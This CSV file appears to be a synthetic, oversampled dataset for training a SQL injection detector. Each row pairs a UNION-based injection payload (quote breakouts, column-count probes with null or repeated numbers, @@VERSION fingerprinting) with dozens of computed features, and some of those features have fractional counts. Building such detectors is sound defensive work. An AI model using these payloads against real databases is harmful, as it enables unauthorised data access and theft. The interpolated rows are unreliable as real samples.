id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000034,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000265,1.0037581309652215,74.41545392056031,22.584546079439683,3.7185562767240388,43.0,9.0,14.0,8.415453920560315,0.5778622489037669,0.12094791256125356,0.18814119731750553,0.11304864121747402,0.41545392056031555,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.0,1.0,0.41545392056031566,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000135,0.4268035347844654,70.76185271439758,22.847629457120487,3.836289355723402,14.0,40.0,4.609482171518058,12.152370542879515,0.1979683927616065,0.5656239793188755,0.06468882688546168,0.17171880103405623,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.1523705428795148,1.0,0.0,8.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.15237054287951468,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000036,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000194,0.0977734646080333,69.45642648935909,25.182570595743638,3.8638560306083685,19.0,28.365141191487275,14.0,8.091285297871819,0.2736639045636853,0.40822851557198736,0.20164708757324182,0.11646049229108554,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.091285297871819,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,union,"1   )    )    as queb where 2449  =  2449 union all select null,null#",nearest_attack_euclidean,R000779,0.43382915182681586,66.9183096821628,24.0,3.7496964114517186,31.334647745730244,9.0,22.0,4.583661936432561,0.46779585030435106,0.13467735798472255,0.32921131951821064,0.06831547219271573,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.5836619364325615,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,union,"1%""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000727,0.3329266254018478,61.33254528278832,17.0,3.2517050911251415,41.334909434423366,1.0,8.997635848364952,10.0,0.6743332223842613,0.01630690989258693,0.14629076879728223,0.16306909892586957,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.1662726413941586,1.0,0.0,5.833727358605842,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000610,0.22638854313659265,58.80351040245246,20.0,3.8896757767772034,14.0,31.042808321961967,4.0,9.760702080490493,0.23840934980777745,0.5275321716482544,0.06811695708793641,0.16594152145603178,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.760702080490492,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"1' in boolean mode  )   union all select null,null,null--",nearest_attack_euclidean,R000288,0.295005369069908,58.506554449704,19.0,3.6655819065767923,40.205243559763204,1.0,11.0,6.301310889940801,0.6870241254578513,0.01711755674881041,0.18829312423691452,0.10756519355642377,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.3013108899408,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,union,-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,nearest_attack_euclidean,R000689,0.6757977772416984,70.48409905521363,27.828033018404543,4.261855222923098,30.562622642127273,15.702787734149997,15.0,9.218688678936363,0.43712997981626256,0.21877844308166886,0.21366705076336706,0.13042452633870158,3.0,0.0,2.6093443394681817,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6093443394681817,4.609344339468182,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000042,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R000388,0.3594846636183725,55.14690356547574,19.146903565475743,3.504544076295633,14.0,16.0,18.0,7.146903565475743,0.2538777110660193,0.2901459555040221,0.3264141999420249,0.12956213348793363,0.14690356547574207,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,1.0,0.14690356547574202,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000218,0.3911205259202276,60.411942144413516,18.717611571117295,3.712233706604093,14.0,33.12955371553081,4.0,9.282388428882703,0.23205318060863633,0.5480565467677663,0.06630090874532467,0.15358936387827274,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.282388428882703,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",nearest_attack_euclidean,R000282,0.20973102726496845,76.87405021950991,21.0,3.6830982472119147,14.0,43.09924017560793,8.0,11.774810043901983,0.18225558428641753,0.5604640892235655,0.10414604816366715,0.1531342783263498,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.774810043901983,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,0.9614614200076893,80.39877516782441,22.398775167824404,3.6972978345535004,47.0,9.0,14.0,10.398775167824404,0.5846076492457181,0.11194614560024388,0.17413844871149048,0.12930775644254758,0.3987751678244046,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.0,3.0,0.39877516782440475,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000554,0.42136069665506404,71.44517749925924,26.777411250370378,3.988391992393372,25.0,23.10964500148151,17.335532497777734,6.0,0.34996537960997853,0.3237701206102577,0.24227280867336892,0.08399169110639487,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.2225887496296222,0.0,0.0,1.777411250370378,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,union,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000753,1.266662522641803,74.96255298725254,22.44860522363861,3.705338144796147,47.41115821089114,9.0,10.0,8.551394776361391,0.6315354966203474,0.1204949408887391,0.13388326765415456,0.11408629483675899,0.44860522363860794,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,6.1027895527227844,1.0,0.4486052236386079,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000374,0.46940069680806357,66.0,20.0,3.654095305555483,14.0,26.794814013420435,15.205185986579565,10.0,0.21212121212121213,0.4059820305063703,0.23038160585726614,0.15151515151515152,0.0,0.0,3.0,0.0,0.0,0.0,0.0,2.301296496644891,0.0,0.0,4.698703503355109,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"1%'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000377,0.3116438832059105,62.36911517204437,17.0,3.3061155847504455,36.69529213763549,1.0,14.0,10.673823034408873,0.5880488136310873,0.016056908058250968,0.22479671281551347,0.17109756549514826,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.673823034408873,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000087,0.5801594412007178,80.27362502525153,27.452749949496923,3.9219855355191555,41.094500101006155,3.4527499494969227,24.726374974748463,11.0,0.5118233035602516,0.043074922200424026,0.3080662611649056,0.1370355130744187,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,6.0,0.0,0.0,1.0,0.7263749747484614,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000060,0.06577774459551189,79.89228580831548,26.0,3.875862626466331,40.0,3.0,25.0,11.89228580831547,0.5006817353904084,0.037551130154280604,0.3129260846190053,0.1488410498363057,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000097,0.7803721436274669,81.5400995687092,31.24059741225517,4.107516876922879,40.0,3.459900431290805,24.540099568709195,13.540099568709195,0.4905745283426125,0.042470872728051556,0.3009312971117772,0.16602330181755875,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.459900431290805,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",nearest_attack_euclidean,R000504,0.004247010856297441,73.0,18.014901131463112,3.4835526724678436,14.0,44.0,4.0,11.0,0.1917808219178082,0.6027397260273972,0.0547945205479452,0.1506849315068493,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000588,0.01813157983338826,59.902635478367,19.0,3.6411359727933506,14.0,31.922108382693605,4.0,9.980527095673402,0.2337463949402612,0.5328612629254157,0.06678468426864605,0.16660765786567697,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.980527095673401,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000241,0.06389959638880384,77.30350015955342,22.060700031910685,3.8023562892002927,14.0,36.24280012764274,14.0,13.060700031910685,0.18114523246218753,0.46876300349771427,0.18114523246218753,0.1689465315779107,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,7.0607000319106845,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000610,0.22539293692249382,58.80877229628304,20.0,3.889606796608969,14.0,31.04701783702643,4.0,9.761754459256608,0.2383870266218295,0.5275576838607663,0.06811057903480844,0.16594471048259576,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.761754459256609,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,0.06905976481778599,78.67017569930559,21.868070279722236,3.6257041514508113,50.73614055944448,9.0,10.0,8.934035139861118,0.6448813109017325,0.11443181982659076,0.12714646647398975,0.11354040279768697,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,6.934035139861119,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000034,0.31344838102046413,76.0,25.550611313918864,3.832571357225681,40.550611313918864,3.0,24.0,8.449388686081136,0.533560675183143,0.039473684210526355,0.3157894736842105,0.1111761669221202,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000059,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000209,1.0905476735411532,56.38140494546512,22.61859505453488,3.8918188471693203,14.0,20.0,14.0,8.38140494546512,0.24832717129181964,0.35475310184545666,0.24832717129181964,0.14859255557090403,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.3814049454651196,0.0,3.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000617,0.45921251704473964,68.55660763089344,22.422643052357376,3.752073076326303,14.0,34.84528610471475,8.0,11.711321526178688,0.20444120728955864,0.5079411324434876,0.11682354702260493,0.17079411324434876,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,6.711321526178688,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000269,0.18614348886728127,68.98639358167496,20.098639358167496,3.570725157431163,14.0,36.78911486533997,8.0,10.197278716334992,0.20327874997295448,0.5328336428926883,0.11615928569883113,0.147728321435526,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.197278716334992,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000106,0.0130559724751859,76.0,25.0,3.8177570484787355,40.0,3.0198093240353714,24.0,8.980190675964629,0.5263157894736842,0.039734333210991735,0.3157894736842105,0.11816040363111353,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000063,attack,union,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",nearest_attack_euclidean,R000116,0.009141856225018648,70.0,20.978011248926165,3.8090286134541618,14.0,36.0,8.0,12.0,0.2,0.5142857142857142,0.11428571428571428,0.17142857142857143,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.0061685578647577965,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526355,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.009897747199309,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000065,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000489,0.4435073748347489,78.16115865497741,20.632231730995482,3.413150981002739,14.0,38.52892692398193,14.0,11.632231730995482,0.17929062980505273,0.4926446346199096,0.1792906298050527,0.14877410576998493,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.632231730995482,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000066,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000431,0.17970681620698745,69.95193436597268,17.0,3.238598426215702,38.76154749277814,1.0,18.0,12.190386873194536,0.5537283564657366,0.01431811881013162,0.2577261385823687,0.17422738614176314,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,5.1903868731945355,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000067,attack,union,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",nearest_attack_euclidean,R000437,0.44082243624424505,69.74815809467623,18.65036838106475,3.4994577560058238,14.0,41.39852647574099,4.0,10.349631618935247,0.2016798840344711,0.592557833564544,0.05762282400984889,0.148139458391136,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.349631618935247,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
